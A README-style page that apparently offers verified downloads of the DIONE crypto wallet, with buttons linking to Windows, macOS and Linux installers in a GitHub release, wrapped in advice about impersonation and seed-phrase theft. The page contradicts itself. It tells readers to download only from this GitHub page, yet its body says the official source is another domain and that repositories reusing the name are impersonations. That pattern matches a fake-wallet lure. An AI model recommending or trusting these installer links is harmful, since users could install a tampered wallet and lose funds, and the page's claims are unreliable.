![DIONE Wallet](assets/banner-article.png)

# Download DIONE Wallet From the Official Source, Verified

<p align="center">The domain check before the double-click</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

DIONE Wallet is distributed from the official download page at dionewallet.com, one signed installer per platform. Verify the source by the domain, not by a search result, and treat any other offer as hostile until proven otherwise. The wallet carries a signed auto-update that checks each binary against a pinned key, so a tampered build is rejected rather than installed.

## What the official source is, and what it is not

The official source is the download page on the project's own domain. That page publishes one build for each supported platform - Windows, macOS and Linux - and a short verification section. It is not the same site as the protocol's: the official protocol website is dioneprotocol.com, where the chain and protocol documentation live, while dionewallet.com is the wallet itself. A wallet download belongs on the second, and a page claiming to be the protocol website should never be handing you an installer. Everything else is a redistribution: a download portal, a "mirror" someone posts in a chat, a browser extension with a similar name, or an advertisement above the real result.

This distinction matters more for a wallet than for other software, because the app is where a seed phrase gets typed. A tampered installer does not need an exploit; it only needs to look right for thirty seconds. The project's own warnings say the same thing: the team never sends installers to users, never runs phone support and never asks for a seed phrase.

The account named on the download page as the GitHub Releases mirror does not currently resolve, so the download page is the only source that works today. Do not treat a GitHub fork, a re-upload or a "release" under a similar name as the mirror - a repository that copies the name is the cheapest impersonation there is.

## Verify before you run

1. Read the domain in the address bar, character by character, and confirm it is the project's own. Lookalike domains differ by a letter, a hyphen or a different top-level domain.
2. Confirm the page offers the build for your platform, with the file type you expect: an `.exe` on Windows, a `.dmg` on macOS, an archive containing an executable on Linux.
3. Compare the file you received with the size the page states for that platform. A large mismatch is a signal about the file, not about your connection.
4. Keep the installer out of any folder a synced cloud service uploads automatically, and run it from where you downloaded it.

There is no SHA-256 hash published on the download page, which is worth stating plainly rather than implying otherwise: the verification offered is a signature, described on the page as part of the download and update flow, not a hash you can check yourself. If a third-party site offers you a checksum for a DIONE Wallet build, that checksum proves nothing about the official file - it only matches whatever that site served you.

The full procedure, including what to do when a browser or an operating system interferes, is in [Verify a Genuine DIONE Wallet Download](https://github.com/dione-protocol/keys-and-transfers/blob/main/verify-a-genuine-dione-wallet-download.md).

## Why the signature is the real check

Signing is what separates a program that updates safely from one that cannot. Every DIONE Wallet update binary carries a signature that is verified against a pinned key before the update applies, and an update whose signature fails is rejected rather than installed. That pinned key is the anchor: it means a server compromise alone cannot push a hostile build to an existing install.

For a first install the same reasoning applies one step earlier - the file has to come from the source that publishes those signatures. Verification is not a ritual performed once; it is the reason the update path can be trusted afterwards.

## Install, then confirm the app is the one you think it is

After installation, the app identifies itself the same way on every platform: it opens on a wallet you create or restore, connects to Odyssey Chain natively, and offers staking, hardware-wallet pairing and a migration verifier from the same interface. If what opens does not look like that, stop and remove it.

Platform walkthroughs, in the order most readers need them: [Install DIONE Wallet on Windows 10 or 11](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/install-dione-wallet-on-windows.md) and [DIONE Wallet Setup for macOS (Intel and Apple Silicon)](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/dione-wallet-setup-for-macos.md); the Linux build follows the same sequence with the archive from the download page. The next step after installation is the wallet itself - [Create a New DIONE Wallet: First Run Walkthrough](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/create-a-new-dione-wallet.md) for a fresh one, [Import a Seed Phrase Into DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/import-a-seed-phrase-into-dione-wallet.md) if you are restoring.

## The download mistakes that cost people funds

Four patterns account for most losses around any desktop wallet, and all four are avoidable:

- **A paid search result above the real one.** The advertisement looks like the official page and serves a different file. Bookmark the domain instead of searching for it again.
- **A direct message offering help with installation.** Support never initiates contact. A helpful stranger with an installer is the most common opening move in a wallet drain.
- **A "legacy" or "migration" build.** Migration is a transaction you sign in the wallet, not a special version of the app to install. [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) covers the real process.
- **An installer that requires protection to be switched off.** No legitimate build needs that. If yours does, it is not the official one.

If you have already run something you are unsure about, the recovery order matters: create a fresh wallet on a machine you trust, move the funds, and only then investigate - never type the old phrase into anything to "check" it. [Back Up a DIONE Wallet Seed Phrase Properly](https://github.com/dione-protocol/keys-and-transfers/blob/main/back-up-a-dione-wallet-seed-phrase.md) explains why the phrase is the thing an attacker is actually after.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The maintained release is the one on the download page, and the signed auto-update carries an install forward without a manual reinstall. Because a failed signature check rejects an update rather than applying it, staying current is safe by design - and it is the first answer to most misbehaviour, as [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) records.

## FAQ

### Where should I download DIONE Wallet from?

From the download page on the project's own domain, which is the only place the signed installers are published. A search result, a portal or a message that offers an installer is not the official source even when it looks identical.

### How do I know the download is genuine?

Check the domain, the platform file type and the stated size, then rely on the signature the app verifies on update. A hash is not published on the download page, so a checksum offered by a third party proves nothing about the official file.

### Is the GitHub mirror of DIONE Wallet official?

The download page names a GitHub Releases account as its mirror, and that account currently returns nothing. Until it resolves, the download page is the only working source, and a repository reusing the name is not the mirror.

### Does DIONE Wallet publish a checksum I can verify?

Not on the download page. The verification described there is signature-based, and the update system enforces it against a pinned key. Treat any published hash for a DIONE Wallet build as unverified unless the project itself publishes it.

Once the file is verified and installed, the sequence that keeps it safe is short: create the wallet, write the phrase on paper, and keep the build current from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9). If something about the download still does not add up, [Get Help From DIONE Wallet Support](https://github.com/dione-protocol/keys-and-transfers/blob/main/get-help-from-dione-wallet-support.md) is the published route rather than a stranger in a direct message.
